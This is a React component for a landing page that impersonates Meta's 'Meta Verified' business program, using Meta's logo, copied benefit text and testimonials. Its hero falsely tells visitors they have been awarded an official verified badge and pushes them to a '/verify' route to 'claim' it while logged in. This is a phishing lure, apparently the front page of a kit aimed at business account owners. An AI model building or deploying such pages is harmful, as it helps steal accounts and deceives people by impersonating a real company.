import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

export default function Home() {
  const navigate = useNavigate();
  
  const benefitsData = [
    { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you. The badge means your Page has been verified by Meta based on your activity across Meta technologies, or information or documents you provided.', image: '/hero.webp' },
    { title: 'Impersonation protection', desc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.', image: '/hero.webp' },
    { title: 'Enhanced support', desc: 'Get 24/7 access to email or chat agent support.', image: '/hero.webp' },
    { title: 'Upgraded profile features', desc: 'Enrich your profile by adding images to your links.', image: '/hero.webp' }
  ];
  const [activeBenefit, setActiveBenefit] = useState(0);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [openFaq, setOpenFaq] = useState(null);

  const testimonials = [
    { quote: '"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."', author: 'Kimber Greenwood, Owner of Water Bear Photography' },
    { quote: '"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up."', author: 'Devon Kirby, Owner, Mom Approved Miami' }
  ];
  const faqs = [
    { q: 'How do I know if my business is eligible?', a: 'Meta Verified is available for businesses that meet certain eligibility requirements in selected regions.' },
    { q: 'How do I update my information if I\'m not eligible?', a: 'Join our waitlist to stay updated.' }
  ];

  return (
    <div style={{ overflowX: 'hidden' }}>
      <header className="header">
          <div className="header-left">
              <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business" /></a>
              <nav className="nav-links">
                  <a className="nav-link" href="#steps">Get started</a>
                  <a className="nav-link" href="#benefits">Advertise</a>
                  <a className="nav-link" href="#faq">Learn</a>
                  <a className="nav-link" href="#footer">Support</a>
              </nav>
          </div>
          <div className="header-right">
              <div className="avatar-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
          </div>
      </header>

      <section id="hero">
          <div className="hero-inner">
              <div className="hero-text">
                  <div className="hero-text-inner">
                      <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                      <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
                      <button className="btn-primary" onClick={() => navigate('/verify')}>Claim your badge</button>
                      <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account.</p>
                  </div>
              </div>
              <div className="hero-image"><img src="/hero.webp" alt="Meta Verified" /></div>
          </div>
      </section>

      <section className="benefits" id="benefits">
          <div className="benefits-header">
              <h2>Explore Meta Verified for business benefits.</h2>
              <p>Meta Verified provides tools to help you build more confidence with new audiences.</p>
          </div>
          <div className="benefits-grid">
              <div className="benefits-image"><img src={benefitsData[activeBenefit].image} alt="Benefit" /></div>
              <div className="benefits-accordion">
                  {benefitsData.map((b, i) => (
                      <div key={i} className={`benefit-item ${i === activeBenefit ? 'active' : ''}`} onClick={() => setActiveBenefit(i)}>
                          <div className="benefit-header"><span>{b.title}</span></div>
                          <div className={`benefit-desc ${i === activeBenefit ? 'open' : ''}`}><p>{b.desc}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <section className="faq" id="faq">
          <div className="faq-inner">
              <h2>Frequently asked questions</h2>
              <div className="faq-list">
                  {faqs.map((f, i) => (
                      <div key={i} className="faq-item">
                          <button className="faq-question" onClick={() => setOpenFaq(openFaq === i ? null : i)}><span>{f.q}</span></button>
                          <div className={`faq-answer ${openFaq === i ? 'open' : ''}`}><p>{f.a}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>
      
      <footer className="footer">
          <div className="footer-inner" style={{ textAlign: 'center', padding: '20px' }}>
              <span className="footer-copy">© 2026 Meta</span>
          </div>
      </footer>
    </div>
  );
}
